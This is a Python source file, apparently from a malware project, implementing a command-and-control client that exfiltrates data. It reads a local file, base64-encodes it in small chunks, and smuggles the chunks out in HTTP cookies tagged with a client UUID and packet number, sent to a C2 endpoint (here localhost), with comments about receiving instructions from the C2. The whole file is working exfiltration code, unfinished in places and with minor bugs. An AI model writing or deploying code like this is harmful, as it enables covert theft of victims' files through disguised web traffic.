from queue import Queue
from sys import getsizeof
import base64

import io
import os

from uuid import uuid1
import requests


URL = "http://127.0.0.1:8080/api"

commands = Queue()

def gen_cookies(client_id, packet_id, data, type="") -> dict:
    # prepare data to be exfiltrated

    cookies = {         # Max cookie size 4093 bytes
        '0': str(client_id),
        '1': str(packet_id),  
        '2': str(type),  # Type [+ filename]
        '3': str(data)   # Frame
    }
    
    # getsizeof(cookies)
    
    if isinstance(data, io.BufferedReader):
        chunk = read_chunk_of_file(data, 10)
        while chunk != b'':
            cookies['3'] = str(base64.b64encode(chunk), "utf-8")
            chunk = read_chunk_of_file(data, 10)
            yield cookies
        
    if isinstance(data, str):
        cookies['3'] = read_chunk_of_file(data, 1000)
        
    yield cookies


def communicate_to_cc(cookies: dict) -> dict:

    r = requests.get(URL, cookies=cookies)
    # extract instructions from CC
    # print(r.cookies)
    return cookies


def read_file(filename: str):
    file = open(filename, "rb")
    return file


def read_chunk_of_file(stream, size):
    return stream.read(size)
    

def communication_client_main():
    # generate uuid1
    client_id = str(uuid1())
    stream = read_file("src\malware\communication\mp.txt")

    # read queue
    for cookie in  gen_cookies(client_id, "1", stream, "file hi.txt"):
        print("-"*20)
        print(base64.b64decode(cookie['3']))
        resp = communicate_to_cc(cookie)

        
    # create cookie
    # commands.put( resp )


if '__main__' == __name__:
    print(os.getcwd())


    communication_client_main()